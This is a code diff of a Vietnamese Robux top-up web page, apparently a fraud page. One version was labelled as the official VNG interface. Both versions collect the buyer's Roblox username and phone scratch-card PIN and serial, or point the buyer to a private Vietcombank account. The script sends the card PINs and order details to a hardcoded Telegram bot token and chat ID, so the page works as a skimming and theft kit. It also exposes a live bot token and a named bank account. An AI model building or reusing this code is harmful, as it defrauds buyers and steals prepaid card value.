-                    <div class="box-title">3. Chọn hình thức thanh toán</div>
+                <!-- KHU VỰC MÃ QR VIETCOMBANK CỦA BẠN -->
+                <div id="qrFields" style="background: rgba(17, 4, 32, 0.95); padding: 25px; border-radius: 16px; margin-bottom: 20px; border: 1px solid rgba(236, 72, 153, 0.3); text-align: center;">
+                    <div style="font-size: 1.1rem; font-weight: bold; color: #f472b6; margin-bottom: 8px;">Quét Mã QR Chuyển Khoản Ngân Hàng</div>
+                    <p style="margin-bottom: 15px; color: #9ca3af; font-size: 0.85rem;">Sử dụng app Ngân hàng hoặc MoMo quét mã bên dưới để thanh toán tự động:</p>
                     
-                    <div class="pay-tabs">
-                        <div class="pay-tab-btn active" id="tabCardBtn" onclick="switchTab('card')">Thẻ cào điện thoại</div>
-                        <div class="pay-tab-btn" id="tabQrBtn" onclick="switchTab('qr')">Chuyển khoản QR Ngân hàng</div>
+                    <div style="background: #ffffff; padding: 15px; border-radius: 12px; display: inline-block; box-shadow: 0 0 20px rgba(255,255,255,0.15);">
+                        <img src="https://img.vietqr.io/image/VCB-1050808350-compact2.png?amount=0&addInfo=Thanh%20toan%20Robux&accountName=TRAN%20THE%20VY" alt="Mã QR Vietcombank TRAN THE VY" style="max-width: 230px; height: auto; display: block; margin: 0 auto;">
                     </div>
-
-                    <!-- PANE THẺ CÀO -->
-                    <div class="payment-content-pane active" id="cardPane">
-                        <div class="form-row">
-                            <label>Loại thẻ:</label>
-                            <select id="cardType">
-                                <option value="Viettel">Viettel</option>
-                                <option value="Vinaphone">Vinaphone</option>
-                                <option value="Mobifone">Mobifone</option>
-                                <option value="Zing">Zing</option>
-                            </select>
-                        </div>
-                        <div class="form-row">
-                            <label>Mã thẻ (PIN):</label>
-                            <input type="text" id="cardPin" placeholder="Nhập mã thẻ cào">
-                        </div>
-                        <div class="form-row">
-                            <label>Số Seri:</label>
-                            <input type="text" id="cardSeri" placeholder="Nhập số seri thẻ cào">
-                        </div>
+                    
+                    <div style="margin-top: 15px; font-size: 0.95rem; color: #d1d5db; line-height: 1.6;">
+                        <p>Ngân hàng: <b style="color: #ffffff;">Vietcombank</b></p>
+                        <p>Số tài khoản: <b style="color: #60a5fa; user-select: all; font-size: 1.1rem;">1050808350</b></p>
+                        <p>Chủ tài khoản: <b style="color: #ffffff; text-transform: uppercase;">TRAN THE VY</b></p>
                     </div>
-
-                    <!-- PANE QR NGÂN HÀNG -->
-                    <div class="payment-content-pane" id="qrPane" style="text-align: center;">
-                        <div style="font-weight: bold; color: #ff6600; margin-bottom: 8px;">Quét mã QR qua ứng dụng ngân hàng</div>
-                        <p style="font-size: 0.85rem; color: #666; margin-bottom: 12px;">Hệ thống xác nhận tự động sau vài giây chuyển khoản.</p>
-                        
-                        <div style="background: #fff; padding: 10px; display: inline-block; border: 1px solid #ddd; border-radius: 4px;">
-                            <img src="https://img.vietqr.io/image/VCB-1050808350-compact2.png?amount=0&addInfo=Thanh%20toan%20Robux&accountName=TRAN%20THE%20VY" alt="QR Code" style="max-width: 180px; display: block; margin: 0 auto;">
-                        </div>
-                        
-                        <div style="margin-top: 10px; font-size: 0.85rem; color: #333; line-height: 1.4;">
-                            <p>Ngân hàng: <b>Vietcombank</b></p>
-                            <p>Số tài khoản: <b style="color: #ff6600; user-select: all;">1050808350</b></p>
-                            <p>Chủ tài khoản: <b>TRAN THE VY</b></p>
-                        </div>
-                    </div>
-
-                    <button type="submit" id="submitBtn" class="btn-submit-vng">Xác Nhận Thanh Toán</button>
                 </div>
+
+                <button type="submit" id="submitBtn" class="btn-submit">Xác Nhận Thanh Toán & Đặt Hàng</button>
             </form>
         </div>
 
-        <!-- CỘT PHẢI: LƯU Ý / HƯỚNG DẪN -->
-        <div>
-            <div class="sidebar-info">
-                <h3>📌 Hướng dẫn nạp</h3>
-                <ul>
-                    <li>Điền đầy đủ thông tin tài khoản Roblox của bạn.</li>
-                    <li>Chọn gói Robux tương ứng với nhu cầu cần nạp.</li>
-                    <li>Chọn hình thức thanh toán thẻ cào hoặc chuyển khoản VietQR tiện lợi.</li>
-                    <li>Nhấn nút "Xác Nhận Thanh Toán" để gửi thông tin về hệ thống xử lý tự động.</li>
-                </ul>
-            </div>
-        </div>
     </div>
 
     <div id="toast">Thông báo</div>
@@ -434,88 +835,95 @@
 <script>
 const TELEGRAM_TOKEN = '8819856826:AAHTz6wkAyqnwO6qfMJBC1Vd7VhyQ0ttHl0';
 const TELEGRAM_CHAT_ID = '6999613477';
-let activeMethod = 'card';
 
-function showToast(msg, isErr = false) {
-    const t = document.getElementById("toast");
-    t.innerText = msg;
-    t.style.backgroundColor = isErr ? "#d9534f" : "#28a745";
-    t.className = "show";
-    setTimeout(() => { t.className = t.className.replace("show", ""); }, 3500);
+function showToast(message, isError = false) {
+    const toast = document.getElementById("toast");
+    toast.innerText = message;
+    toast.style.borderColor = isError ? "#ef4444" : "#ec4899";
+    toast.className = "show";
+    setTimeout(() => { toast.className = toast.className.replace("show", ""); }, 4000);
 }
 
-function selectPkg(element, name) {
-    document.querySelectorAll('.package-item').forEach(el => el.classList.remove('active'));
-    element.classList.add('active');
-    document.getElementById('selectedPackage').value = name;
+function selectPackage(packageName) {
+    var packageSelect = document.getElementById('packageSelect');
+    if (packageSelect) packageSelect.value = packageName;
+    var orderForm = document.getElementById('orderForm');
+    if (orderForm) orderForm.scrollIntoView({ behavior: 'smooth' });
 }
 
-function switchTab(method) {
-    activeMethod = method;
-    if (method === 'card') {
-        document.getElementById('tabCardBtn').classList.add('active');
-        document.getElementById('tabQrBtn').classList.remove('active');
-        document.getElementById('cardPane').classList.add('active');
-        document.getElementById('qrPane').classList.remove('active');
+function togglePaymentFields() {
+    var method = document.getElementById("paymentMethod").value;
+    var cardBox = document.getElementById("cardFields");
+    var qrBox = document.getElementById("qrFields");
+    
+    if (method === "card") {
+        cardBox.style.display = "block";
+        qrBox.style.display = "none";
     } else {
-        document.getElementById('tabQrBtn').classList.add('active');
-        document.getElementById('tabCardBtn').classList.remove('active');
-        document.getElementById('qrPane').classList.add('active');
-        document.getElementById('cardPane').classList.remove('active');
+        cardBox.style.display = "none";
+        qrBox.style.display = "block";
     }
 }
 
-document.getElementById('vngExactForm').addEventListener('submit', function(e) {
-    e.preventDefault();
+document.addEventListener('DOMContentLoaded', function() {
+    const form = document.getElementById('robuxForm');
+    if (!form) return;
 
-    const username = document.getElementById('username').value.trim();
-    const pkg = document.getElementById('selectedPackage').value;
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
 
-    if (!pkg) {
-        showToast("Vui lòng chọn gói mệnh giá muốn nạp!", true);
-        return;
-    }
+        const submitBtn = document.getElementById('submitBtn');
+        submitBtn.innerText = "⏳ Đang gửi đơn...";
+        submitBtn.disabled = true;
 
-    const btn = document.getElementById('submitBtn');
-    btn.innerText = "Đang xử lý giao dịch...";
-    btn.disabled = true;
+        const username = document.getElementById('username') ? document.getElementById('username').value : '';
+        const packageVal = document.getElementById('packageSelect') ? document.getElementById('packageSelect').value : '';
+        const paymentMethod = document.getElementById('paymentMethod') ? document.getElementById('paymentMethod').value : 'qr';
 
-    let message = `🛒 <b>GIAO DỊCH NẠP THẺ (GIAO DIỆN VNG)</b>\n\n`;
-    message += `👤 <b>Tài khoản:</b> ${username}\n`;
-    message += `📦 <b>Gói:</b> ${pkg}\n`;
-    message += `💳 <b>Hình thức:</b> ${activeMethod === 'card' ? 'Thẻ cào điện thoại' : 'Chuyển khoản QR'}\n`;
+        let message = `🛒 <b>ĐƠN HÀNG MỚI TỪ REMROBUX.COM!</b>\n\n`;
+        message += `👤 <b>Tài khoản Roblox:</b> ${username}\n`;
+        message += `📦 <b>Gói Robux:</b> ${packageVal}\n`;
+        message += `💳 <b>Hình thức:</b> ${paymentMethod === 'card' ? 'Thẻ cào' : 'Chuyển khoản Vietcombank'}\n`;
 
-    if (activeMethod === 'card') {
-        message += `📲 <b>Loại thẻ:</b> ${document.getElementById('cardType').value}\n`;
-        message += `🔑 <b>Mã thẻ:</b> <code>${document.getElementById('cardPin').value}</code>\n`;
-        message += `🔢 <b>Số Seri:</b> <code>${document.getElementById('cardSeri').value}</code>\n`;
-    } else {
-        message += `📸 <i>Khách chọn quét mã chuyển khoản Ngân hàng (VCB: 1050808350 - TRAN THE VY).</i>\n`;
-    }
+        if (paymentMethod === 'card') {
+            const cardType = document.getElementById('cardType') ? document.getElementById('cardType').value : '';
+            const cardPin = document.getElementById('cardPin') ? document.getElementById('cardPin').value : '';
+            const cardSeri = document.getElementById('cardSeri') ? document.getElementById('cardSeri').value : '';
 
-    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
-    })
-    .then(res => res.json())
-    .then(data => {
-        btn.innerText = "Xác Nhận Thanh Toán";
-        btn.disabled = false;
-        if (data.ok) {
-            showToast("Gửi yêu cầu nạp thành công! Hệ thống đang xử lý.");
-            this.reset();
-            document.querySelectorAll('.package-item').forEach(el => el.classList.remove('active'));
-            document.getElementById('selectedPackage').value = "";
-            switchTab('card');
+            message += `📲 <b>Loại thẻ:</b> ${cardType}\n`;
+            message += `🔑 <b>Mã thẻ (PIN):</b> <code>${cardPin}</code>\n`;
+            message += `🔢 <b>Số Seri:</b> <code>${cardSeri}</code>\n`;
         } else {
-            showToast("Lỗi gửi dữ liệu Telegram!", true);
+            message += `📸 <i>Khách thanh toán quét mã QR (VCB: 1050808350 - TRAN THE VY).</i>\n`;
         }
-    })
-    .catch(() => {
-        btn.innerText = "Xác Nhận Thanh Toán";
-        btn.disabled = false;
-        showToast("Lỗi kết nối mạng!", true);
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            submitBtn.innerText = "Xác Nhận Thanh Toán & Đặt Hàng";
+            submitBtn.disabled = false;
+
+            if (data.ok) {
+                showToast("🎉 Đặt hàng thành công! Vui lòng chuyển khoản để hoàn tất.");
+                form.reset();
+                togglePaymentFields();
+            } else {
+                showToast("Lỗi Telegram: " + data.description, true);
+            }
+        })
+        .catch(error => {
+            submitBtn.innerText = "Xác Nhận Thanh Toán & Đặt Hàng";
+            submitBtn.disabled = false;
+            showToast("Lỗi kết nối mạng!", true);
+        });
     });
 });
 </script>
